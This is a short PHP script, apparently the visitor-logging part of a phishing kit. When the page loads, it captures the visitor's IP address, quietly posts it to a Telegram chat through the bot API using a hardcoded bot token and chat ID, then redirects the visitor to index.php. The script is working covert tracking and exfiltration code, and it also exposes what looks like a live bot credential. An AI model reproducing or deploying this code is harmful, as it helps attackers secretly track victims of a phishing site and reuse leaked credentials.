<?php
$ip = $_SERVER['REMOTE_ADDR'];
$date = date("m-d-y");
$rez = "NEW VISITOR [$ip]";
telegramBot($rez);
header("location: index.php");
		function telegramBot($txt) {
	$url = "https://api.telegram.org/bot1745982631:AAH5Ah2sMYmK7IGXRW25KS8dFmsDQYEG400/sendMessage?";
	$timestamp = date("c", strtotime("now"));
	$json_data = json_encode([

	    "chat_id" => "-1001651820441",
	    "text"	  => $txt
	   

	], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

	$ch = curl_init( $url );
	curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
	curl_setopt( $ch, CURLOPT_POST, 1);
	curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
	curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt( $ch, CURLOPT_HEADER, 0);
	curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

	$response = curl_exec( $ch );
	curl_close( $ch );
	}
	
	
	?>